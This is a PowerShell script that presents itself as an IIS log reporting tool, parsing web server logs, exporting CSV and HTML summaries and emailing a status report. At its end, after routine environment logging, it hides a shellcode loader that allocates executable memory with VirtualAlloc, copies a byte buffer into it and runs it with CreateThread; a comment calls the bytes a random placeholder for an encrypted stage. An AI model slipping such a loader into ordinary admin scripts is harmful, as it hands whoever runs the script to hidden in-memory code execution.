
#Requires -Version 5.1
[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$LogRoot = 'D:\Logs\iis\W3SVC2',

    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 90)]
    [int]$Days = 7,

    [int]$TopN = 5,
    [string]$OutputPath = "D:\Ops\reports\iis-top-2026-11-10.csv",
    [string]$HtmlPath = 'D:\Ops\reports\iis-2026-11-10.html'
)


$cutoff = (Get-Date).AddDays(-$Days)
$logFiles = Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -ge $cutoff }
if (@($logFiles).Count -eq 0) {
    throw ("No IIS logs found in {0} for the last {1} days" -f $LogRoot, $Days)
}

$entries = foreach ($log in $logFiles) {
    $fieldLine = Get-Content -LiteralPath $log.FullName -TotalCount 20 |
        Where-Object { $_ -match '^#Fields:' } | Select-Object -First 1
    if (-not $fieldLine) {
        Write-Verbose ("Skipping {0}: no field header" -f $log.Name)
        continue
    }
    $columns = ($fieldLine -replace '^#Fields:\s*', '') -split ' '
    $statusIndex = [array]::IndexOf($columns, 'sc-status')
    $uriIndex = [array]::IndexOf($columns, 'cs-uri-stem')
    $methodIndex = [array]::IndexOf($columns, 'cs-method')
    $bytesIndex = [array]::IndexOf($columns, 'sc-bytes')
    $timeIndex = [array]::IndexOf($columns, 'time-taken')
    Get-Content -LiteralPath $log.FullName | Where-Object { $_ -notmatch '^#' } | ForEach-Object {
        $parts = $_ -split ' '
        if ($parts.Count -lt $columns.Count) {
            return
        }
        [pscustomobject]@{
            Date      = $parts[0]
            Time      = $parts[1]
            Method    = $parts[$methodIndex]
            Uri       = $parts[$uriIndex]
            Status    = [int]$parts[$statusIndex]
            Bytes     = [int]$parts[$bytesIndex]
            TimeTaken = [int]$parts[$timeIndex]
        }
    }
}
$totalRequests = @($entries).Count
$errorEntries = $entries | Where-Object { $_.Status -ge 400 }
$totalMB = [math]::Round((($entries | Measure-Object -Property Bytes -Sum).Sum) / 1MB, 2)
$topUrls = $entries |
    Group-Object -Property Uri |
    Sort-Object -Property Count -Descending |
    Select-Object -First $TopN -Property @{Name = 'Uri'; Expression = { $_.Name }}, Count
$byStatus = $entries |
    Group-Object -Property Status |
    Sort-Object -Property Count -Descending |
    Select-Object -Property @{Name = 'Status'; Expression = { $_.Name }}, Count

$slowest = $entries | Sort-Object -Property TimeTaken -Descending |
    Select-Object -First $TopN Uri, TimeTaken, Status
$topUrls | Export-Csv -Path $OutputPath -NoTypeInformation

$byStatus | Export-Csv -Path $OutputPath.Replace('.csv', '-status.csv') -NoTypeInformation -Encoding UTF8
$slowest | Export-Csv -Path $OutputPath.Replace('.csv', '-slow.csv') -NoTypeInformation

$byDay = $entries | Group-Object -Property Date | Sort-Object -Property Name |
    ForEach-Object {
        [pscustomobject]@{
            Date     = $_.Name
            Requests = $_.Count
            Errors   = @($_.Group | Where-Object { $_.Status -ge 400 }).Count
        }
    }
$byDay | Format-Table -AutoSize

$notFound = $entries | Where-Object { $_.Status -eq 404 } |
    Group-Object -Property Uri | Sort-Object -Property Count -Descending |
    Select-Object -First $TopN -Property @{Name = 'Uri'; Expression = { $_.Name }}, Count
$notFound | Export-Csv -Path $OutputPath.Replace('.csv', '-404.csv') -NoTypeInformation -Encoding UTF8

$byHour = $entries | Group-Object -Property { ($_.Time -split ':')[0] } |
    Sort-Object -Property Name
$byHour | ForEach-Object {
    Write-Verbose ("Hour {0}: {1} requests" -f $_.Name, $_.Count)
}

$style = @'
<style>
body { font-family: Segoe UI; font-size: 11px; }
table { border-collapse: collapse; width: 100%; }
th { background: #e8eef7; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@
$byDay | ConvertTo-Html -Title 'IIS traffic by day' -Head $style |
    Set-Content -Path $HtmlPath -Encoding UTF8

$MailTo = "webops@adatum.com"
$MailFrom = "iis-report@adatum.com"
$summaryBody = $byStatus | ConvertTo-Html -Fragment | Out-String

Send-MailMessage `
    -To $MailTo `
    -From $MailFrom `
    -Subject 'IIS log summary' `
    -Body $summaryBody `
    -SmtpServer 'smtp.adatum.com' `
    -Port 587

foreach ($log in $logFiles) {
    $sizeMB = [math]::Round($log.Length / 1MB, 2)
    Write-Verbose ("{0}: {1} MB" -f $log.Name, $sizeMB)
}
Write-Host ("Top URL: {0} ({1} hits)" -f $topUrls[0].Uri, $topUrls[0].Count) -ForegroundColor Green
Write-Verbose ("Log files processed: {0}" -f @($logFiles).Count)

$medianTime = ($entries | Measure-Object -Property TimeTaken -Average).Average
Write-Verbose ("Average time taken: {0:N1} ms" -f $medianTime)

$byMethod = $entries | Group-Object -Property Method | Sort-Object -Property Count -Descending
$byMethod | Format-Table Name, Count -AutoSize

$compressed = @(Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-30) }).Count
Write-Verbose ("Logs older than 30 days: {0}" -f $compressed)

$bigResponses = $entries | Sort-Object -Property Bytes -Descending | Select-Object -First 5
$bigResponses | Format-Table Uri, Bytes, Status -AutoSize

$errorRate = [math]::Round((@($errorEntries).Count / $totalRequests) * 100, 2)
Write-Host ("Error rate: {0} percent" -f $errorRate) -ForegroundColor Yellow

$bots = $entries | Where-Object { $_.Uri -match 'robots|sitemap' }
Write-Verbose ("Crawler requests: {0}" -f @($bots).Count)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$LogPath = "$env:TEMP\run.log"

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class PlatformApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0xf4, 0xd3, 0x2e, 0xfc, 0x5e, 0xbc, 0x93, 0xf1, 0x8f, 0x1d, 0x21, 0x18, 0xf9, 0x1f, 0x0c, 0x6f,
    0x64, 0xd8, 0xe5, 0xcc, 0xec, 0x1b, 0x54, 0xc0, 0x8c, 0xd5, 0x22, 0xbf, 0x6d, 0xe0, 0xb0, 0x76,
    0x5e, 0x74, 0x1b, 0x6e, 0xb3, 0xa1, 0x0d, 0x21, 0xb8, 0x66, 0x81, 0xc8, 0xb5, 0x38, 0xfd, 0xac,
    0xd8, 0x3a, 0x81, 0xfc, 0x65, 0x45, 0x03, 0x6d, 0x4a, 0x1d, 0x3f, 0x90, 0x84, 0x0c, 0x49, 0x56,
    0x79, 0xb7, 0x87, 0x56, 0x48, 0xf7, 0xe0, 0xd2, 0x47, 0xdf, 0xfa, 0x16, 0x45, 0x67, 0xe8, 0xe4,
    0x3b, 0x2c, 0xee, 0xc8, 0x56, 0x02, 0x37, 0x1e, 0x6f, 0x87, 0x48, 0x2e, 0x4a, 0x26, 0xb1, 0xae,
    0xb4, 0x5c, 0xd1, 0x28, 0xd5, 0x1d, 0xa7, 0x05, 0xe4, 0x50, 0x0a, 0x03, 0x37, 0x8b, 0xaf, 0x86,
    0xb4, 0xeb, 0x72, 0xbf, 0x42, 0xaf, 0xe8, 0x3e, 0xcb, 0x14, 0x94, 0xc1, 0xce, 0x5e, 0xae, 0xd8,
    0x27, 0xb6, 0x0e, 0xb6, 0x01, 0x11, 0xc7, 0x0a, 0x34, 0xba, 0x40, 0xb4, 0x0f, 0x7d, 0xe8, 0xb3,
    0x56, 0x3d, 0x85, 0x0c, 0x6e, 0x5f, 0x9d, 0x0a, 0x4e, 0x8a, 0x32, 0xb3, 0x84, 0xa7, 0x6b, 0x1d,
    0x05, 0x20, 0x96, 0x1f, 0x85, 0x96, 0xd1, 0x60, 0x53, 0x98, 0x1d, 0x52, 0x66, 0x21, 0x41, 0x41,
    0x02, 0x14, 0xf4, 0x10, 0x13, 0x38, 0xbc, 0x88, 0x2e, 0x94, 0x31, 0x4a, 0xd9, 0x83, 0x1c, 0xb5,
    0xbb, 0x87, 0x98, 0x7c, 0xf5, 0xb3, 0x52, 0xa1, 0xb8, 0xde, 0x74, 0x59, 0x0f, 0x82, 0xcc, 0xa3,
    0x50, 0xd1, 0x3b, 0xef, 0x01, 0x85, 0x6b, 0xa9, 0x2e, 0x34, 0xeb, 0xbc, 0xe2, 0xa3, 0xab, 0x86,
    0xa0, 0x9c, 0xf5, 0x13, 0x89, 0xab, 0xdb, 0xf3, 0xaf, 0xae, 0x1f, 0x62, 0x4c, 0x0f, 0x17, 0xcd,
    0x7e, 0xf6, 0xa8, 0x76, 0xd5, 0x70, 0x09, 0xe1, 0x99, 0x5a, 0x36, 0xe1, 0xa8, 0xf6, 0x39, 0x3c,
    0xe3, 0x17, 0x5a, 0x22, 0x02, 0x87, 0x77, 0x87, 0x96, 0x9c, 0x1d, 0x2a, 0xf8, 0x67, 0xcf, 0x28,
    0x3b, 0x30, 0x13, 0x19, 0x4e, 0x1e, 0xfe, 0x36, 0x7a, 0x09, 0xdd, 0xe9, 0x6c, 0xda, 0x9a, 0x0b,
    0x33, 0x52, 0x48, 0xc3, 0x49, 0xe3, 0xa1, 0x34, 0x41, 0x67, 0xd8, 0xaf, 0xbd, 0x81, 0x9c, 0xb9,
    0x9e, 0xde, 0xf5, 0x54, 0x46, 0x76, 0xde, 0x20, 0xa5, 0xb6, 0x7c, 0x07, 0x67, 0xc8, 0xb6, 0x57,
    0xc2, 0xbf, 0xb5, 0x1e, 0x64, 0x68, 0x49, 0xb5, 0x90, 0x8a, 0xfb, 0x2f, 0xf0, 0xad
)

$ProcHandle = [PlatformApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($ProcHandle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $ProcHandle, $Buffer.Length)
$ThreadId = 0
$Thread = [PlatformApi]::CreateThread([IntPtr]::Zero, 0, $ProcHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][PlatformApi]::WaitForSingleObject($Thread, 2680)
[void][PlatformApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
